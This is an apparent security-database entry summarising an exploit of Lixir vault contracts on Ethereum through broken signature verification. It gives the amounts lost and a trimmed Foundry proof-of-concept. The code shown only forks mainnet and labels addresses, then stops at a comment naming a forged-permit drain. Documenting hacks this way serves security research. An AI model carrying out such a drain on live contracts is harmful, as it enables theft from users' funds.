# [?] LixirPermitDrain - Broken Signature Verification

## Summary
Severity: Unknown
Chain: Ethereum
Component: LixirPermitDrain
Published: 2026-06-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/LixirPermitDrain_exp.sol
Type: defi-exploit-poc

## Details
Lost: 2.60 ETH, 4,477.72 USDC, 3,609.95 USDT, 24,182.56 LIX

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 25_391_315;
        vm.createSelectFork("mainnet", forkBlock);
        vm.coinbase(BLOCK_MINER);

        attacker = ATTACKER;
        multiAssetLog = true;
        _addFundingToken(address(0));
        _addFundingToken(TOKEN_USDC);
        _addFundingToken(TOKEN_USDT);
        _addFundingToken(TOKEN_LIX);

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(BLOCK_MINER, "Block beneficiary");
        vm.label(TOKEN_USDC, "USDC");
        vm.label(TOKEN_USDT, "USDT");
        vm.label(TOKEN_LIX, "LIX");
        vm.label(LV_WETH_USDC_A, "Lixir lv_WETH-USDC A");
        vm.label(LV_LIX_WETH_A, "Lixir lv_LIX-WETH A");
        vm.label(LV_WETH_USDC_B, "Lixir lv_WETH-USDC B");
        vm.label(LV_LIX_WETH_B, "Lixir lv_LIX-WETH B");
        vm.label(LV_USDC_USDT_A, "Lixir lv_USDC-USDT A");
        vm.label(LV_USDC_USDT_B, "Lixir lv_USDC-USDT B");
    }

    function testExploit() public balanceLog {
        uint256 attackerEthBefore = ATTACKER.balance;
        uint256 attackerUsdcBefore = IERC20(TOKEN_USDC).balanceOf(ATTACKER);
        uint256 attackerUsdtBefore = IERC20(TOKEN_USDT).balanceOf(ATTACKER);
        uint256 attackerLixBefore = IERC20(TOKEN_LIX).balanceOf(ATTACKER);
        uint256 minerEthBefore = BLOCK_MINER.balance;

        // step 1: deploy a fresh helper that performs the forged-permit drain during construction.
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/LixirPermitDrain_exp.sol_
